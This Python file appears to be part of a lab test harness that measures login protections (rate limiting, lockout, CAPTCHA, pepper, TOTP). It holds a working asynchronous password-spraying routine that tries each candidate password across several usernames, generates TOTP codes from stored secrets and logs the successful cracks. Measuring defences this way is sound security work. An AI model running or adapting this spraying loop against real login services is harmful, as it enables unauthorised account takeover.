import time
import asyncio
import pyotp
import httpx
from typing import Optional
from tests.test_attacks import (
    GROUP_SEED, USER_PASSWORDS, USER_CATEGORIES, USER_SECRETS,
    ALL_PASSWORDS, HASH_MODE, RATE_LIMIT_ENABLED, LOCKOUT_ENABLED,
    CAPTCHA_ENABLED, PEPPER_ENABLED, TOTP_ENABLED, BASE_URL
)
from tests.client import make_login_attempt, HTTP_CLIENT_TIMEOUT_SECONDS
from tests.reporting import (
    calculate_success_rate_by_category, calculate_average_latency,
    print_attack_summary, save_attack_results
)


# Constants
DEFAULT_RATE_LIMIT_DELAY: float = 0.0


async def password_spraying_attack(
    target_usernames: Optional[list] = None,
    passwords_to_try: Optional[list] = None,
    rate_limit: float = DEFAULT_RATE_LIMIT_DELAY,
) -> dict:
    if target_usernames is None:
        target_usernames = ["weak_user_01", "weak_user_02", "medium_user_01", "strong_user_01"]

    if passwords_to_try is None:
        passwords_to_try = ALL_PASSWORDS

    protection_flags = {
        "rate_limit": RATE_LIMIT_ENABLED,
        "lockout": LOCKOUT_ENABLED,
        "captcha": CAPTCHA_ENABLED,
        "pepper": PEPPER_ENABLED,
        "totp": TOTP_ENABLED
    }

    endpoint = "/login_totp" if TOTP_ENABLED else "/login"

    results = []
    success = False
    time_to_crack = None
    correct_password = None
    cracked_username = None
    start_time = time.time()

    async with httpx.AsyncClient(timeout=HTTP_CLIENT_TIMEOUT_SECONDS) as client:
        for idx, password in enumerate(passwords_to_try, 1):
            if success:
                break

            for username in target_usernames:
                password_category = "unknown"
                for user, pwd in USER_PASSWORDS.items():
                    if pwd == password:
                        password_category = USER_CATEGORIES.get(user, "unknown")
                        break

                payload = {"username": username, "password": password}
                if TOTP_ENABLED:
                    secret = USER_SECRETS.get(username)
                    if secret:
                        payload["totp_code"] = pyotp.TOTP(secret).now()

                start = time.time()
                response = await make_login_attempt(client, BASE_URL, endpoint, payload)
                latency = (time.time() - start) * 1000

                result = {
                    "attempt": idx,
                    "timestamp": time.time(),
                    "group_seed": GROUP_SEED,
                    "username": username,
                    "password": password,
                    "password_category": password_category,
                    "hash_mode": HASH_MODE,
                    "protection_flags": protection_flags.copy(),
                    "status_code": response.status_code,
                    "success": response.status_code == 200,
                    "latency_ms": latency,
                    "captcha_used": "captcha_token" in str(response.request.content) if hasattr(response, 'request') else False
                }
                results.append(result)

                if response.status_code == 200:
                    success = True
                    time_to_crack = time.time() - start_time
                    correct_password = password
                    cracked_username = username
                    break

                if rate_limit > 0:
                    await asyncio.sleep(rate_limit)

    total_time = time.time() - start_time

    report = {
        "attack_type": "password_spraying",
        "group_seed": GROUP_SEED,
        "hash_mode": HASH_MODE,
        "protection_flags": protection_flags,
        "target_username": cracked_username or target_usernames[0],
        "target_category": USER_CATEGORIES.get(cracked_username or target_usernames[0], "unknown"),
        "target_usernames": target_usernames,
        "cracked_username": cracked_username,
        "total_attempts": len(results),
        "total_time_seconds": round(total_time, 2),
        "attempts_per_second": round(len(results) / total_time, 2) if total_time > 0 else 0,
        "success": success,
        "correct_password": correct_password,
        "time_to_crack": round(time_to_crack, 2) if time_to_crack else None,
        "avg_latency_ms": round(calculate_average_latency(results), 2),
        "success_rate_by_category": calculate_success_rate_by_category(results),
        "use_totp": TOTP_ENABLED,
        "results": results
    }

    save_attack_results(report)

    print_attack_summary(report)

    return report


